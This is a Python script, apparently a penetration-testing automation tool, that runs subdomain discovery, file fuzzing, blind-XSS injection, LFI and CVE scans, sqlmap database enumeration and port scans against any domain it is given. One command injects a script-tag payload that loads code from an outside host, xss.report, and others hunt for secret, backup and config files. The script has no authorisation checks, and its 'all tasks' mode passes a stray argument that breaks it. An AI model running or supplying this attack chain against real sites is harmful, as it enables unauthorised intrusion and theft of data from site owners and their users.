import os
import sys
import argparse
import subprocess
import socket
from colorama import Fore, Style, init
import random

# Initialize colorama
init(autoreset=True)

def random_color():
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
    return random.choice(colors)

def create_target_directory(target):
    base_dir = "target"
    if not os.path.exists(base_dir):
        os.makedirs(base_dir)
    
    target_dir = os.path.join(base_dir, target)
    if not os.path.exists(target_dir):
        os.makedirs(target_dir)
    
    return target_dir

def check_tool(tool_name):
    result = subprocess.run(['which', tool_name], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return result.returncode == 0

def get_ip_address(target):
    try:
        ip_address = socket.gethostbyname(target)
        return ip_address
    except socket.error as err:
        print(f"{random_color()}Error getting IP address: {err}")
        return None

def run_command(command, output_file=None):
    print(f"{random_color()}[*] Running command: {command}")
    try:
        result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if output_file:
            with open(output_file, 'w') as f:
                f.write(result.stdout.decode())
        print(f"{random_color()}[*] Command completed successfully")
    except subprocess.CalledProcessError as e:
        print(f"{random_color()}[!] Command failed with error: {e.stderr.decode()}")
        print(f"{random_color()}[!] Command output: {e.output.decode()}")
        sys.exit(1)

def enum_subdomains(target, target_dir):
    print(f"{random_color()}[*] Starting subdomain enumeration")
    run_command(f"subfinder -d {target} -all -recursive > {target_dir}/{target}-subdomain.txt")
    run_command(f"cat {target_dir}/{target}-subdomain.txt | httpx-toolkit -ports 80,8080,8000,8888 -threads 200 > {target_dir}/{target}-subdomains_alive.txt")
    katana_cmd = f"katana -u {target_dir}/{target}-subdomains_alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o {target_dir}/{target}-allurls.txt"
    run_command(katana_cmd)
    run_command(f"cat {target_dir}/{target}-allurls.txt | grep -E '\\.txt|\\.log|\\.cache|\\.secret|\\.db|\\.backup|\\.yml|\\.json|\\.gz|\\.rar|\\.zip|\\.config|\\.js$' >> {target_dir}/{target}-sensitive.txt")

def fuzzing(target, target_dir):
    print(f"{random_color()}[*] Starting directory and file fuzzing")
    run_command(f"dirsearch -u https://{target}/ -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,http://sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js.,.json -o {target_dir}/dirsearch-{target}.txt")

def xss_finding(target, target_dir):
    print(f"{random_color()}[*] Starting XSS vulnerability finding")
    run_command(f"subfinder -d {target} | httpx-toolkit -silent | katana -ps -f qurl | gf xss | bxss -appendMode -payload '\'><script src=https://xss.report/c/coffinxp></script>' -parameters > {target_dir}/xss-results.txt")

def lfi_finding(target, target_dir):
    print(f"{random_color()}[*] Starting LFI vulnerability finding")
    run_command(f"cat {target_dir}/{target}-allurls.txt | gf lfi | nuclei -tags lfi > {target_dir}/lfi-results.txt")

def nuclei_scan(target, target_dir):
    print(f"{random_color()}[*] Starting vulnerability scan with nuclei")
    run_command(f"nuclei -list {target_dir}/{target}-subdomains_alive.txt -tags cve,osint,tech > {target_dir}/nuclei-results.txt")

def sql_injection(target, target_dir, url=None):
    if url:
        print(f"{random_color()}[*] Starting SQL injection scanning on URL: {url}")
        try:
            # Run sqlmap directly on the URL
            run_command(f"sqlmap -u {url} --batch --dbs --risk 2 --level 5 --flush-session --random-agent | tee -a {target_dir}/sqli.txt")
        except subprocess.CalledProcessError as e:
            print(f"{random_color()}[!] Error occurred during SQL injection scan: {e.stderr.decode()}")
            print(f"{random_color()}[!] SQL injection scan failed for URL: {url}")
    else:
        print(f"{random_color()}[*] Starting SQL injection scanning using URLs from file")
        run_command(f"cat {target_dir}/{target}-allurls.txt | gau | urldedupe | gf sqli > {target_dir}/sql.txt")
        run_command(f"sqlmap -m {target_dir}/sql.txt --batch --dbs --risk 2 --level 5 --flush-session --random-agent | tee -a {target_dir}/sqli.txt")

def shodan_search(target, target_dir):
    print(f"{random_color()}[*] Starting Shodan search")
    run_command(f"shodan search '{target}' > {target_dir}/shodan-results.txt")

def gobuster_fuzzing(target, target_dir):
    print(f"{random_color()}[*] Starting Gobuster fuzzing")
    run_command(f"gobuster dir -u https://{target} -w /path/to/wordlist.txt -o {target_dir}/gobuster-{target}.txt")

def port_scan(target, target_dir):
    print(f"{random_color()}[*] Starting port scan")
    subdomains_alive_file = os.path.join(target_dir, f"{target}-subdomains_alive.txt")
    
    if os.path.exists(subdomains_alive_file) and os.path.getsize(subdomains_alive_file) > 0:
        run_command(f"naabu -list {subdomains_alive_file} -c 50 -nmap-cli 'nmap -sV -sC' -o {target_dir}/{target}-naabu-full.txt")
    else:
        print(f"{random_color()}No alive subdomains found in {subdomains_alive_file}. Performing port scan on the main target.")
        run_command(f"naabu -host {target} -c 50 -o {target_dir}/{target}-naabu-full.txt")
        run_command(f"nmap -sV -Pn -d --script=http-enum,firewall-bypass -A {target} -o {target_dir}/{target}-nmap.txt")

def main():
    parser = argparse.ArgumentParser(description="PT Automation Tool")
    parser.add_argument("target", help="Target domain or URL")
    parser.add_argument("-e", "--enum", action="store_true", help="Perform enumeration")
    parser.add_argument("-f", "--fuzz", action="store_true", help="Perform fuzzing")
    parser.add_argument("-x", "--xss", action="store_true", help="Perform XSS finding")
    parser.add_argument("-l", "--lfi", action="store_true", help="Perform LFI finding")
    parser.add_argument("-n", "--nuclei", action="store_true", help="Perform vulnerability scan")
    parser.add_argument("-g", "--gobuster", action="store_true", help="Perform Gobuster fuzzing")
    parser.add_argument("-p", "--port", action="store_true", help="Perform port scan")
    parser.add_argument("-s", "--sql", action="store_true", help="Perform SQL injection")
    parser.add_argument("-u", "--url", help="Specify URL for SQL injection")
    parser.add_argument("-a", "--all", action="store_true", help="Perform all tasks")
    args = parser.parse_args()

    target = args.target
    target_dir = create_target_directory(target)
    ip_address = get_ip_address(target)

    if ip_address:
        print(f"{random_color()}[*] TARGET URL: {target}")
        print(f"{random_color()}[*] TARGET IP ADDRESS: {ip_address}")

    if args.all:
        tools = {
            "enum": enum_subdomains,
            "fuzz": fuzzing,
            "xss": xss_finding,
            "lfi": lfi_finding,
            "nuclei": nuclei_scan,
            "sql": sql_injection,
            "gobuster": gobuster_fuzzing,
            "port": port_scan
        }
        for tool_name, tool_func in tools.items():
            print(f"{random_color()}[*] Starting {tool_name} tool")
            tool_func(target, target_dir, args.url)  # Pass url argument to functions as needed
    else:
        if args.enum:
            print(f"{random_color()}[*] Starting subdomain enumeration")
            enum_subdomains(target, target_dir)
        if args.fuzz:
            print(f"{random_color()}[*] Starting directory and file fuzzing")
            fuzzing(target, target_dir)
        if args.xss:
            print(f"{random_color()}[*] Starting XSS vulnerability finding")
            xss_finding(target, target_dir)
        if args.lfi:
            print(f"{random_color()}[*] Starting LFI vulnerability finding")
            lfi_finding(target, target_dir)
        if args.nuclei:
            print(f"{random_color()}[*] Starting vulnerability scan with nuclei")
            nuclei_scan(target, target_dir)
        if args.sql:
            print(f"{random_color()}[*] Starting SQL injection scanning")
            sql_injection(target, target_dir, args.url)  # Pass url argument
        if args.gobuster:
            print(f"{random_color()}[*] Starting Gobuster fuzzing")
            gobuster_fuzzing(target, target_dir)
        if args.port:
            print(f"{random_color()}[*] Starting port scan")
            port_scan(target, target_dir)

if __name__ == "__main__":
    main()
